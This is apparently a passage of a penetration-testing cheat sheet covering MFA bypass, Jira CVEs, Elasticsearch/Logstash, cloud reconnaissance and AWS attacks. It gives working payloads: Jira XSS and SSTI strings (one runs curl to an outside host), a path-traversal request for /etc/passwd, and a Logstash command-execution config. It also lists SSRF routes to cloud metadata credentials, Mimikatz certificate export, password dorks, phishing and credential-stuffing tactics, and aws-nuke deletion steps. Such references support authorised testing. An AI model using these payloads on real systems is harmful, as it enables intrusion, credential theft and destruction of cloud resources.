<pre><code class="language-bash"># Fuzzing dictionary
https://raw.githubusercontent.com/jackrichardzon/s4p0/master/S4P-DIR.txt

# SAP-RECON
https://github.com/chipik/SAP_RECON

# SAP multiple
https://github.com/shipcod3/mySapAdventures

# SAP wordlist
https://github.com/emadshanab/SAP-wordlist/blob/main/SAP-wordlist.txt

# SAP ports
https://buddysap.com/list-of-sap-port-used-in-sap-abap-and-java-system/
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="mfa"><a class="header" href="#mfa">MFA</a></h1>
<h2 id="common-flaws"><a class="header" href="#common-flaws">Common flaws</a></h2>
<pre><code># Lack of rate limit
    - Exploitation:
    1. Request 2FA code and capture this request.
    2. Repeat this request for 100–200 times and if there is no limitation set, that’s a rate limit issue.
    3. At 2FA Code Verification page, try to brute-force for valid 2FA and see if there is any success.
    4. You can also try to initiate, requesting OTPs at one side and brute-forcing at another side. Somewhere the OTP will match in middle and may give you a quick result.
# Rate limit bypass
    # Limiting the flow rate
    # Generated OTP code doesn’t change
    # Rate-limit resetting when updating the code
    # Bypassing the rate limit by changing the IP address
    # Support for X-Forwarded-For turned on
# Bypass replacing part of the request from the session
# Bypass using the "Remember Me" functionality
    # If 2FA is attached using a cookie, the cookie value must be unguessable
    # If 2FA is attached to an IP address, you can try to replace your IP address
# Improper access control bug on the 2FA dialog page
# Insufficient censorship of personal data on the 2FA page
# Ignoring 2FA under certain circumstances.
    # 2FA ignoring when recovering a password
    # Ignoring 2FA when entering through a social network
    # Ignoring 2FA in an older version of the application
    # Ignoring 2FA in case of cross-platforming
# When disabling 2FA, the current code or password is not requested
# Previously created sessions remain valid after activation of 2FA
# Lack of Rate-limit in the user’s account (OTP is validated, but user's id not)
# Manipulation of API’s versions
# Improper Access Control in the backup codes request
# Response body manipulation
# HTTP Response Status Code Manipulation
# Code Leakage in Response
# Direct Request/Forceful Browsing
    - Exploitation:
    1. Normal flow: Login -&gt; MFA -&gt; Profile
    2. Attack: Login -&gt; MFA, instead input MFA navigate to Profile
# Cached OTP in Dynamic JS Files
# OTP Code Reusability
</code></pre>
<h2 id="mindmaps-1"><a class="header" href="#mindmaps-1">Mindmaps</a></h2>
<p><img src="enumeration/webservices/../../.gitbook/assets/image%20(15).png" alt="" /></p>
<p><img src="enumeration/webservices/../../.gitbook/assets/image%20(37).png" alt="" /></p>
<p><img src="enumeration/webservices/../../.gitbook/assets/MFA.png" alt="" /></p>
<pre><code>https://medium.com/@iSecMax/two-factor-authentication-security-testing-and-possible-bypasses-f65650412b35
https://blog.cobalt.io/bypassing-the-protections-mfa-bypass-techniques-for-the-win-8ef6215de6ab
https://research.nccgroup.com/2021/06/10/testing-two-factor-authentication/
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="gwt"><a class="header" href="#gwt">GWT</a></h1>
<pre><code class="language-text"># Google Web Toolkit
# https://github.com/FSecureLABS/GWTMap
./gwtmap.py -u http://target.com/olympian/olympian.nocache.js --filter AuthenticationService.login --rpc --probe
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="jira"><a class="header" href="#jira">Jira</a></h1>
<pre><code class="language-bash"># Jira Scanner
# https://github.com/bcoles/jira_scan
# https://github.com/MayankPandey01/Jira-Lens

# cve-2019-8449 
# The /rest/api/latest/groupuserpicker resource in Jira before version 8.4.0 allows remote attackers to enumerate usernames via an information disclosure vulnerability. 
 https://jira.atlassian.com/browse/JRASERVER-69796
 https://victomhost/rest/api/latest/groupuserpicker?query=1&amp;maxResults=50000&amp;showAvatar=true

# cve-2019-8451:ssrf-response-body 
# The /plugins/servlet/gadgets/makeRequest resource in Jira before version 8.4.0 allows remote attackers to access the content of internal network resources via a Server Side Request Forgery (SSRF) vulnerability due to a logic bug in the JiraWhitelist class.
https://jira.atlassian.com/browse/JRASERVER-69793?jql=labels%20%3D%20
https://victomhost/plugins/servlet/gadgets/makeRequest?url=https://victomhost:1337@example.com

#RCE Jira=CVE-2019–11581
#https://hackerone.com/reports/706841
/secure/ContactAdministrators!default.jspa

# cve-2018-20824
# vulnerable to Server Side Request Forgery (SSRF). This allowed a XSS and or a SSRF attack to be performed. More information about the Atlassian OAuth plugin issue see https://ecosystem.atlassian.net/browse/OAUTH-344 . When running in an environment like Amazon EC2, this flaw can used to access to a metadata resource that provides access credentials and other potentially confidential information. 
 https://victomhost/plugins/servlet/Wallboard/?dashboardId=10000&amp;dashboardId=10000&amp;cyclePeriod=alert(document.domain)

# cve-2020-14179 
# Atlassian Jira Server and Data Center allow remote, unauthenticated attackers to view custom field names and custom SLA names via an Information Disclosure vulnerability in the /secure/QueryComponent!Default.jspa endpoint.
REF=https://jira.atlassian.com/browse/JRASERVER-71536
POC: 
https://victomhost/secure/QueryComponent!Default.jspa

# cve-2020-14181 
# Atlassian Jira Server and Data Center allow an unauthenticated user to enumerate users via an Information Disclosure vulnerability in the /ViewUserHover.jspa endpoint.
Ref=https://jira.atlassian.com/browse/JRASERVER-71560?jql=text%20~%20%22cve-2020-14181%22
# POC:
https://victomhost/secure/ViewUserHover.jspa
https://victomhost/ViewUserHover.jspa?username=Admin
https://hackerone.com/reports/380354

# CVE-2018-5230
# https://jira.atlassian.com/browse/JRASERVER-67289
#HOW TO EXPLOIT:
https://host/issues/?filter=-8
#Go to the link above
#Click the "Updated Range:" text area
#Put your XSS payload in "More than [ ] minutes ago" (15 character payload limit) or in "In range [ ] to [ ]" (No length limit, ONLY put the payload in the first box)
#Click Update
#Payload will run. If it doesn't run chances are you used double quotes somewhere. Only use single quotes!

# jira-unauthenticated-dashboards  
https://victomhost/rest/api/2/dashboard?maxResults=100

# jira-unauth-popular-filters 
https://victomhost/secure/ManageFilters.jspa?filter=popular&amp;filterView=popular

# https://hackerone.com/reports/197726
https://newrelic.atlassian.net/secure/ManageFilters.jspa?filterView=popular
https://newrelic.atlassian.net/secure/ManageFilters.jspa?filterView=search

# https://hackerone.com/reports/139970
https://host/secure/ConfigurePortalPages!default.jspa?view=popular
https://host/secure/ManageFilters.jspa?filterView=search&amp;Search=Search&amp;filterView=search&amp;sortColumn=favcount&amp;sortAscending=false

#/pages/%3CIFRAME%20SRC%3D%22javascript%3Aalert(‘XSS’)%22%3E.vm

# CVE-2019-3403
# Information disclosure vulnerability
https://jira.atlassian.com/browse/JRASERVER-69242
#visit the URL address,you can check the user whether is exist on this host
/rest/api/2/user/picker?query=admin
# So the attacker can enumerate all existing users on this jira server.

# CVE-2019-8442
https://jira.atlassian.com/browse/JRASERVER-69241
#visit the URL address,the server will leaking some server's information
/s/thiscanbeanythingyouwant/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml
/rest/api/2/user/picker?query=admin
/s/thiscanbeanythingyouwant/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml

# CVE-2017-9506
#https://blog.csdn.net/caiqiiqi/article/details/89017806
/plugins/servlet/oauth/users/icon-uri?consumerUri=https://www.google.nl

#CVE-2019-3402：[Jira]XSS in the labels gadget
/secure/ConfigurePortalPages!default.jspa?view=search&amp;searchOwnerUserName=x2rnu%3Cscript%3Ealert(1)%3C%2fscript%3Et1nmk&amp;Search=Search
ConfigurePortalPages.jspa

#CVE-2018-20824：[Jira]XSS in WallboardServlet through the cyclePeriod parameter
/plugins/servlet/Wallboard/?dashboardId=10100&amp;dashboardId=10101&amp;cyclePeriod=(function(){alert(document.cookie);return%2030000;})()&amp;transitionFx=none&amp;random=true

#CVE-2019-3396: [Path Traversal &amp; RCE]
POST /rest/tinymce/1/macro/preview HTTP/1.1
Host: JIRA
...

{"contentId":"1","macro":{"name":"widget","params":{"url":"https://www.viddler(.)com/v/23464dc5","width":"1000","height":"1000","_template":"file:///etc/passwd"},"body":""}}

#CVE-2019-11581: [SSTI]
http://&lt;JIRA&gt;/secure/ContactAdministrators!default.jspa
#Try SSTI payload in subject and/or body:
$i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('curl http://xyz.burp(.)net').waitFor()

#CVE-2020-14178: [Project Key Enum]
http://&lt;JIRA&gt;/browse.&lt;PROJECTKEY&gt;

#CVE-2020-36289: [Username Enumeration] 
https://&lt;JIRA&gt;/secure/QueryComponentRendererValue!Default.jspa?assignee=user:admin

#jira-unauthenticated-dashboards:
https://&lt;JIRA&gt;/rest/api/2/dashboard?maxResults=100

#jira-unauth-popular-filters:
https://&lt;JIRA&gt;/secure/ManageFilters.jspa?filterView=popular
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="oidc-open-id-connect"><a class="header" href="#oidc-open-id-connect">OIDC (Open ID Connect)</a></h1>
<pre><code class="language-text"># Software using this
Keycloak (Red Hat)
Bitbucket Server (Atlassian)
GitLab
Salesforce Lightning
Amazon Cognito (AWS)

# Check /.well-known/openid-configuration

# Look for uri-redirect &amp; SSRF
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="elk"><a class="header" href="#elk">ELK</a></h1>
<h2 id="elasticsearch"><a class="header" href="#elasticsearch">Elasticsearch</a></h2>
<h3 id="enum"><a class="header" href="#enum">Enum</a></h3>
<pre><code class="language-text"># Check status:
curl -X GET "ELASTICSEARCH-SERVER:9200/"

# Check Auth enabled:
curl -X GET "ELASTICSEARCH-SERVER:9200/_xpack/security/user"

# Users:
elastic:changeme
kibana_system
logstash_system
beats_system
apm_system
remote_monitoring_user

# Other endpoints
/_cluster/health
/_cat/indices
/_cat/health

# Interesting endpoints (BE CAREFUL)
/_shutdown
/_cluster/nodes/_master/_shutdown
/_cluster/nodes/_shutdown
/_cluster/nodes/_all/_shutdown
</code></pre>
<h3 id="with-creds"><a class="header" href="#with-creds">With creds</a></h3>
<pre><code class="language-text"># Using the API key:
curl -H "Authorization: ApiKey &lt;API-KEY&gt;" ELASTICSEARCH-SERVER:9200/

# Get more information about the rights of an user:
curl -X GET "ELASTICSEARCH-SERVER:9200/_security/user/&lt;USERNAME&gt;"

# List all users on the system:
curl -X GET "ELASTICSEARCH-SERVER:9200/_security/user"

# List all roles on the system:
curl -X GET "ELASTICSEARCH-SERVER:9200/_security/role
</code></pre>
<h3 id="internal-config-files"><a class="header" href="#internal-config-files">Internal config files</a></h3>
<pre><code class="language-text">Elasticsearch configuration: /etc/elasticsearch/elasticsearch.yml
Kibana configuration: /etc/kibana/kibana.yml
Logstash configuration: /etc/logstash/logstash.yml
Filebeat configuration: /etc/filebeat/filebeat.yml
Users file: /etc/elasticsearch/users_roles
</code></pre>
<h2 id="kibana"><a class="header" href="#kibana">Kibana</a></h2>
<h3 id="basic-1"><a class="header" href="#basic-1">Basic</a></h3>
<pre><code class="language-text"># Port: 5601
# Config file &amp;&amp; users: /etc/kibana/kibana.yml
# Try also with use kibana_system
# Version &lt; 6.6.0 = RCE (https://github.com/LandGrey/CVE-2019-7609/)
</code></pre>
<h2 id="logstash"><a class="header" href="#logstash">Logstash</a></h2>
<h3 id="basic-2"><a class="header" href="#basic-2">Basic</a></h3>
<pre><code class="language-text"># Pipelines config: /etc/logstash/pipelines.yml
# Check pipelines with this property: "config.reload.automatic: true"
# If file wildcard is specified:
###################
input {
  exec {
    command =&gt; "whoami"
    interval =&gt; 120
  }
}

output {
  file {
    path =&gt; "/tmp/output.log"
    codec =&gt; rubydebug
  }
}
####################
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="sharepoint"><a class="header" href="#sharepoint">Sharepoint</a></h1>
<p>Good reference:</p>
<p>https://www.crummie5.club/the-lone-sharepoint/</p>
<p>https://medium.com/@ujmalhotra95/tales-of-sharepoint-api-misconfigurations-11073ad384fd</p>
<pre><code># 1. Fuzz exposed endpoints 
# 2. Analyze misconfigs to gain auth access
# 3. Check the list of latest RCEs
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="others"><a class="header" href="#others">Others</a></h1>
<pre><code># Laravel RCE
https://github.com/zhzyker/CVE-2021-3129

# Oracle WebLogic
https://github.com/0nise/weblogic-framework

# Jolokia
https://github.com/laluka/jolokia-exploitation-toolkit

# Salesforce
https://github.com/reconstation/sret

# Spring boot
https://tutorialboy24.blogspot.com/2022/02/introduction-to-spring-boot-related.html

# SaltStack
https://skylightcyber.com/2023/02/09/a-salt-attacking-saltstack/

# CMS
https://github.com/Tuhinshubhra/CMSeeK
https://github.com/dionach/CMSmap
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="cloud"><a class="header" href="#cloud">Cloud</a></h1>
<ul>
<li><a href="enumeration/cloud/general.html">General</a></li>
<li><a href="enumeration/cloud/aws.html">AWS</a></li>
<li><a href="enumeration/cloud/azure.html">Azure</a></li>
<li><a href="enumeration/cloud/gcp.html">Google Cloud Platform</a></li>
<li><a href="enumeration/cloud/cloud-info-recon.html">Cloud Info Gathering</a></li>
<li><a href="enumeration/cloud/docker-and-and-kubernetes.html">Docker &amp;&amp; Kubernetes</a></li>
<li><a href="enumeration/cloud/cdn-comain-fronting.html">CDNs</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="general-5"><a class="header" href="#general-5">General</a></h1>
<h2 id="tools-26"><a class="header" href="#tools-26">Tools</a></h2>
<pre><code class="language-bash"># Non provider specific and general purpose
# https://github.com/nccgroup/ScoutSuite
# https://github.com/SygniaLabs/security-cloud-scout
# https://github.com/initstring/cloud_enum
python3 cloud_enum.py -k companynameorkeyword
# https://github.com/cyberark/SkyArk
# https://github.com/SecurityFTW/cs-suite
    cd /tmp
    mkdir .aws
    cat &gt; .aws/config &lt;&lt;EOF
        [default]
        output = json
        region = us-east-1
    EOF
    cat &gt; .aws/credentials &lt;&lt;EOF
        [default]
        aws_access_key_id = XXXXXXXXXXXXXXX
        aws_secret_access_key = XXXXXXXXXXXXXXXXXXXXXXXXX
    EOF
    docker run -v `pwd`/.aws:/root/.aws -v `pwd`/reports:/app/reports securityftw/cs-suite -env aws

# Dictionary
https://gist.github.com/BuffaloWill/fa96693af67e3a3dd3fb

Searching for bad configurations

No auditable items:
• DoS testing
• Intense fuzzing
• Phishing the cloud provider’s employees
• Testing other company’s assets
• Etc.
</code></pre>
<h2 id="audit-policies"><a class="header" href="#audit-policies">Audit policies</a></h2>
<p>https://www.microsoft.com/en-us/msrc/pentest-rules-of-engagement</p>
<p>https://aws.amazon.com/security/penetration-testing</p>
<p>https://support.google.com/cloud/answer/6262505?hl=en</p>
<h2 id="comparison-table"><a class="header" href="#comparison-table">Comparison table</a></h2>
<p><img src="enumeration/cloud/../../.gitbook/assets/image%20(30).png" alt="" /></p>
<h2 id="recon-1"><a class="header" href="#recon-1">Recon</a></h2>
<pre><code class="language-bash"># PoC from Forward DNS dataset
# This data is created by extracting domain names from a number of sources and then sending DNS queries for each domain.
# https://opendata.rapid7.com/sonar.fdns_v2/
cat CNAME-DATASET-NAME | pigz -dc | grep -E "\.azurewebsites\.com"
cat CNAME-DATASET-NAME | pigz -dc | grep -E "\.s3\.amazonaws\.com"

# https://github.com/99designs/clouddetect
clouddetect -ip=151.101.1.68

• First step should be to determine what services are in use
• More and more orgs are moving assets to the cloud one at a time
• Many have limited deployment to cloud providers, but some have fully embraced the cloud and are using it for AD, production assets, security products, and more
• Determine things like AD connectivity, mail gateways, web apps, file storage, etc.
• Traditional host discovery still applies
• After host discovery resolve all names, then perform whois
lookups to determine where they are hosted
• Microsoft, Amazon, Google IP space usually indicates cloud service usage
   ◇ More later on getting netblock information for each cloud service
• MX records can show cloud-hosted mail providers
• Certificate Transparency (crt.sh)
• Monitors and logs digital certs
• Creates a public, searchable log
• Can help discover additional subdomains
• More importantly… you can potentially find more Top Level Domains (TLD’s)!
• Single cert can be scoped for multiple domains
• Search (Google, Bing, Baidu, DuckDuckGo): site:targetdomain.com -site:www.targetdomain.com
• Shodan.io and Censys.io zoomeye.org
• Internet-wide portscans
• Certificate searches
• Shodan query examples:
   ◇ org:”Target Name”
   ◇ net:”CIDR Range”
   ◇ port:”443”
• DNS Brute Forcing
• Performs lookups on a list of potential subdomains
• Make sure to use quality lists
• SecLists: https://github.com/danielmiessler/SecLists/tree/master/Discovery/DNS
• MX Records can help us identify cloud services in use
   ◇ O365 = target-domain.mail.protection.outlook.com
   ◇ G-Suite = google.com | googlemail.com
   ◇ Proofpoint = pphosted.com
• If you find commonalities between subdomains try iterating names
•  Other Services
   ◇ HackerTarget https://hackertarget.com/
   ◇ ThreatCrowd  https://www.threatcrowd.org/
   ◇ DNSDumpster  https://dnsdumpster.com/
   ◇ ARIN Searches  https://whois.arin.net/ui/
      ▪ Search bar accepts wild cards “*”
      ▪ Great for finding other netblocks owned by the same organization
• Azure Netblocks
      ▪ Public: https://www.microsoft.com/en-us/download/details.aspx?id=56519
      ▪ US Gov: http://www.microsoft.com/en-us/download/details.aspx?id=57063
      ▪ Germany: http://www.microsoft.com/en-us/download/details.aspx?id=57064
      ▪ China: http://www.microsoft.com/en-us/download/details.aspx?id=57062
• AWS Netblocks
   ◇ https://ip-ranges.amazonaws.com/ip-ranges.json
• GCP Netblocks
   ◇ Google made it complicated so there’s a script on the next page to get the current IP netblocks.
• Box.com Usage
   ◇ Look for any login portals
      ▪ https://companyname.account.box.com
   ◇ Can find cached Box account data too 
• Employees
   ◇ LinkedIn
   ◇ PowerMeta https://github.com/dafthack/PowerMeta
   ◇ FOCA https://github.com/ElevenPaths/FOCA
   ◇ hunter.io

 Tools:
    • Recon-NG https://github.com/lanmaster53/recon-ng
    • OWASP Amass https://github.com/OWASP/Amass
    • Spiderfoot https://www.spiderfoot.net/
    • Gobuster https://github.com/OJ/gobuster
    • Sublist3r https://github.com/aboul3la/Sublist3r

Foothold:
• Find ssh keys in shhgit.darkport.co.uk https://github.com/eth0izzle/shhgit
• GitLeaks https://github.com/zricethezav/gitleaks
• Gitrob https://github.com/michenriksen/gitrob
• Truffle Hog https://github.com/dxa4481/truffleHog

Password attacks:
• Password Spraying
   ◇ Trying one password for every user at an org to avoid account lockouts (Spring2020)
• Most systems have some sort of lockout policy
   ◇ Example: 5 attempts in 30 mins = lockout
• If we attempt to auth as each individual username one time every 30 mins we lockout nobody
• Credential Stuffing
   ◇ Using previously breached credentials to attempt to exploit password reuse on corporate accounts
• People tend to reuse passwords for multiple sites including corporate accounts
• Various breaches end up publicly posted
• Search these and try out creds
• Try iterating creds

Web server explotation
• Out-of-date web technologies with known vulns
• SQL or command injection vulns
• Server-Side Request Forgery (SSRF)
• Good place to start post-shell:
• Creds in the Metadata Service
• Certificates
• Environment variables
• Storage accounts
• Reused access certs as private keys on web servers
   ◇ Compromise web server
   ◇ Extract certificate with Mimikatz
   ◇ Use it to authenticate to Azure
• Mimikatz can export “non-exportable” certificates:
    mimikatz# crypto::capi
    mimikatz# privilege::debug
    mimikatz# crypto::cng
    mimikatz# crypto::certificates /systemstore:local_machine /store:my /export

Phising
• Phishing is still the #1 method of compromise
• Target Cloud engineers, Developers, DevOps, etc.
• Two primary phishing techniques:
   ◇ Cred harvesting / session hijacking
   ◇ Remote workstation compromise w/ C2
• Attack designed to steal creds and/or session cookies
• Can be useful when security protections prevent getting shells
• Email a link to a target employee pointing to cloned auth portal
   ◇ Examples: Microsoft Online (O365, Azure, etc.), G-Suite, AWS Console
• They auth and get real session cookies… we get them too.

Phishing: Remote Access
• Phish to compromise a user’s workstation
• Enables many other options for gaining access to cloud resources
• Steal access tokens from disk
• Session hijack
• Keylog
• Web Config and App Config files
   ◇ Commonly found on pentests to include cleartext creds
   ◇ WebApps often need read/write access to cloud storage or DBs
   ◇ Web.config and app.config files might contain creds or access tokens
   ◇ Look for management cert and extract to pfx like publishsettings files
   ◇ Often found in root folder of webapp
• Internal Code Repositories
   ◇ Gold mine for keys
   ◇ Find internal repos:
      ▪ A. Portscan internal web services (80, 443, etc.) then use EyeWitness to screenshot each service to quickly analyze
      ▪ B. Query AD for all hostnames, look for subdomains git, code, repo, bitbucket, gitlab, etc..
   ◇ Can use automated tools (gitleaks, trufflehog, gitrob) or use built-in search features
      ▪ Search for AccessKey, AKIA, id_rsa, credentials, secret, password, and token
• Command history
• The commands ran previously may indicate where to look
• Sometimes creds get passed to the command line
• Linux hosts command history is here:
   ◇ ~/.bash_history
• PowerShell command history is here:
   ◇ %USERPROFILE%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

Post-Compromise Recon
• Who do we have access as?
• What roles do we have?
• Is MFA enabled?
• What can we access (webapps, storage, etc.?)
• Who are the admins?
• How are we going to escalate to admin?
• Any security protections in place (ATP, GuardDuty, etc.)?

Service metadata summary
AWS
http://169.254.169.254/metadata/v1/*
Google Cloud
http://metadata.google.internal/computeMetadata/v1/*
DigitalOcean 
http://169.254.169.254/metadata/v1/*
Docker 
http://127.0.0.1:2375/v1.24/containers/json
Kubernetes ETCD 
http://127.0.0.1:2379/v2/keys/?recursive=true
Alibaba Cloud
http://100.100.100.200/latest/meta-data/*
Microsoft Azure
http://169.254.169.254/metadata/v1/*

</code></pre>
<p><img src="enumeration/cloud/../../.gitbook/assets/image%20(39).png" alt="" /></p>
<h2 id="cloud-labs"><a class="header" href="#cloud-labs">Cloud Labs</a></h2>
<ul>
<li>AWS Labs 
<ul>
<li>flaws.cloud </li>
<li>flaws2.cloud </li>
<li>https://github.com/OWASP/Serverless-Goat </li>
<li>https://n0j.github.io/2017/10/02/aws-s3-ctf.html</li>
<li>https://github.com/RhinoSecurityLabs/cloudgoat </li>
<li>https://github.com/appsecco/attacking-cloudgoat2 </li>
<li>https://github.com/m6a-UdS/dvca </li>
<li>https://github.com/OWASP/DVSA </li>
<li>https://github.com/nccgroup/sadcloud </li>
<li>https://github.com/torque59/AWS-Vulnerable-Lambda</li>
<li>https://github.com/wickett/lambhack </li>
<li>https://github.com/BishopFox/iam-vulnerable </li>
</ul>
</li>
<li>GCP Labs 
<ul>
<li>http://thunder-ctf.cloud/ https://gcpgoat.joshuajebaraj.com/</li>
</ul>
</li>
<li>Azure Labs 
<ul>
<li>https://github.com/azurecitadel/azure-security-lab</li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="cloud-info-gathering"><a class="header" href="#cloud-info-gathering">Cloud Info Gathering</a></h1>
<pre><code class="language-text"># Azure IP Ranges
https://azurerange.azurewebsites.net/

# AWS IP Range
https://ip-ranges.amazonaws.com/ip-ranges.json
- Get creation date
jq .createDate &lt; ip-ranges.json
- Get info for specific region
jq  '.prefixes[] | select(.region=="us-east-1")' &lt; ip-ranges.json
- Get all IPs
jq -r '.prefixes | .[].ip_prefix' &lt; ip-ranges.json

# Online services
https://viewdns.info/
https://securitytrails.com/
https://www.shodan.io/search?query=net%3A%2234.227.211.0%2F24%22
https://censys.io/ipv4?q=s3

#Azure AD Recon
https://github.com/dievus/Oh365UserFinder

#AWS Recon
https://github.com/righteousgambit/quiet-riot

# Google Dorks
site:*.amazonaws.com -www "compute"
site:*.amazonaws.com -www "compute" "ap-south-1"
site:pastebin.com "rds.amazonaws.com" "u " pass OR password
https://storage.googleapis.com/COMPANY

# Check certificate transparency logs
https://crt.sh
%.netfilx.com

# Find Cloud Services
python3 cloud_enum.py -k keywork
python3 CloudScraper.py -u https://example.com

# AWS Buckets
# Dork
site:*.s3.amazonaws.com ext:xls | ext:xlsx | ext:csv password|passwd|pass user|username|uid|email

# AWS discovering, stealing keys and endpoints
# Nimbostratus - check against acutal profile
https://github.com/andresriancho/nimbostratus
python nimbostratus dump-credentials

# ScoutSuite - audit AWS, GCP and Azure clouds
scout --provider aws --profile stolen

# Prowler - AWS security assessment, auditing and hardening
https://github.com/toniblyx/prowler
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="aws"><a class="header" href="#aws">AWS</a></h1>
<h2 id="aws-basic-info"><a class="header" href="#aws-basic-info">AWS basic info</a></h2>
<pre><code>Auth methods:
• Programmatic access - Access + Secret Key
   ◇ Secret Access Key and Access Key ID for authenticating via scripts and CLI
• Management Console Access
   ◇ Web Portal Access to AWS

AWS services lists by endpoint
https://docs.aws.amazon.com/general/latest/gr/rande.html

Recon:
• AWS Usage
   ◇ Some web applications may pull content directly from S3 buckets
   ◇ Look to see where web resources are being loaded from to determine if S3 buckets are being utilized
   ◇ Burp Suite
   ◇ Navigate application like you normally would and then check for any requests to:
      ▪ https://[bucketname].s3.amazonaws.com
      ▪ https://s3-[region].amazonaws.com/[OrgName]

S3:
• Amazon Simple Storage Service (S3)
   ◇ Storage service that is “secure by default”
   ◇ Configuration issues tend to unsecure buckets by making them publicly accessible
   ◇ Nslookup can help reveal region
   ◇ S3 URL Format:
      ▪ https://[bucketname].s3.amazonaws.com
      ▪ https://s3-[region].amazonaws.com/[Org Name]
        # aws s3 ls s3://bucket-name-here --region 
        # aws s3api get-bucket-acl --bucket bucket-name-here
        # aws s3 cp readme.txt  s3://bucket-name-here --profile newuserprofile

EBS Volumes:
• Elastic Block Store (EBS)
• AWS virtual hard disks
• Can have similar issues to S3 being publicly available
• Difficult to target specific org but can find widespread leaks

EC2:
• Like virtual machines
• SSH keys created when started, RDP for Windows.
• Security groups to handle open ports and allowed IPs.

AWS Instance Metadata URL
• Cloud servers hosted on services like EC2 needed a way to orient themselves because of how dynamic they are
• A “Metadata” endpoint was created and hosted on a non-routable IP address at 169.254.169.254
• Can contain access/secret keys to AWS and IAM credentials
• This should only be reachable from the localhost
• Server compromise or SSRF vulnerabilities might allow remote attackers to reach it
• IAM credentials can be stored here:
   ◇ http://169.254.169.254/latest/meta-data/iam/security-credentials/
• Can potentially hit it externally if a proxy service (like Nginx) is being hosted in AWS.
   ◇ curl --proxy vulndomain.target.com:80 http://169.254.169.254/latest/meta-data/iam/security-credentials/ &amp;&amp; echo
• CapitalOne Hack
   ◇ Attacker exploited SSRF on EC2 server and accessed metadata URL to get IAM access keys. Then, used keys to dump S3 bucket containing 100 million individual’s data.
• AWS EC2 Instance Metadata service Version 2 (IMDSv2)
• Updated in November 2019 – Both v1 and v2 are available
• Supposed to defend the metadata service against SSRF and reverse proxy vulns
• Added session auth to requests
• First, a “PUT” request is sent and then responded to with a token
• Then, that token can be used to query data
--
TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`
curl http://169.254.169.254/latest/meta-data/profile -H "X-aws-ec2-metadata-token: $TOKEN"
curl http://example.com/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ISRM-WAF-Role
--

Post-compromise
• What do our access keys give us access to?
• Check AIO tools to do some recon (WeirdAAL- recon_module, PACU privesc,...)

http://169.254.169.254/latest/meta-data
http://169.254.169.254/latest/meta-data/iam/security-credentials/&lt;IAM Role Name&gt;

# AWS nuke - remove all AWS services of our account
# https://github.com/rebuy-de/aws-nuke
- Fill nuke-config.yml with the output of aws sts get-caller-identity
./aws-nuke -c nuke-config.yml # Checks what will be removed
- If fails because there is no alias created
aws iam create-account-alias --account-alias unique-name
./aws-nuke -c nuke-config.yml --no-dry-run # Will perform delete operation

# Cloud Nuke
# https://github.com/gruntwork-io/cloud-nuke
cloud-nuke aws

# Other bypasses
1.
aws eks list-clusters | jq -rc '.clusters'
["example"]
aws eks update-kubeconfig --name example
kubectl get secrets

2. SSRF AWS Bypasses to access metadata endpoint.
Converted Decimal IP: http://2852039166/latest/meta-data/
IPV6 Compressed: http://[::ffff:a9fe:a9fe]/latest/meta-data/
IPV6 Expanded: http://[0:0:0:0:0:ffff:a9fe:a9fe]/latest/meta-data/

# Interesting metadata instance urls:
http://instance-data
http://169.254.169.254
http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/user-data/iam/security-credentials/[ROLE NAME]
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]
http://169.254.169.254/latest/meta-data/iam/security-credentials/PhotonInstance
http://169.254.169.254/latest/meta-data/ami-id
http://169.254.169.254/latest/meta-data/reservation-id
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/public-keys/
http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key
http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy
http://169.254.169.254/latest/meta-data/iam/security-credentials/s3access
http://169.254.169.254/latest/dynamic/instance-identity/document
</code></pre>
<h3 id="find-aws-in-domaincompany"><a class="header" href="#find-aws-in-domaincompany">Find AWS in domain/company</a></h3>
<pre><code># Find subdomains

./sub.sh -s example.com
assetfinder example.com
## Bruteforcing
python3 dnsrecon.py -d example.com -D subdomains-top1mil-5000.txt -t brt

# Reverse DNS lookups
host subdomain.domain.com
host IP

# Bucket finders
python3 cloud_enum.py -k example.com
ruby lazys3.rb companyname
# https://github.com/bbb31/slurp
slurp domain -t example.com
</code></pre>
<h3 id="aio-aws-tools"><a class="header" href="#aio-aws-tools">AIO AWS tools</a></h3>
<pre><code># https://github.com/carnal0wnage/weirdAAL
pip3 install -r requirements
cp env.sample .env
vim .env
python3 weirdAAL.py -l

# https://github.com/RhinoSecurityLabs/pacu
bash install.sh
python3 pacu.py
import_keys --all
ls

# https://github.com/dagrz/aws_pwn
# Lot of scripts for different purposes, check github

# IAM resources finder
# https://github.com/BishopFox/smogcloud
smogcloud

# Red team scripts for AWS
# https://github.com/elitest/Redboto

# AWS Bloodhound
# https://github.com/lyft/cartography

# AWS Exploitation Framework
# https://github.com/grines/scour
</code></pre>
<h2 id="s3"><a class="header" href="#s3">S3</a></h2>
<h3 id="basic-commands"><a class="header" href="#basic-commands">Basic Commands</a></h3>
<pre><code>aws s3 ls s3:// 
aws s3api list-buckets
aws s3 ls s3://bucket.com
aws s3 ls --recursive s3://bucket.com
aws s3 sync s3://bucketname s3-files-dir
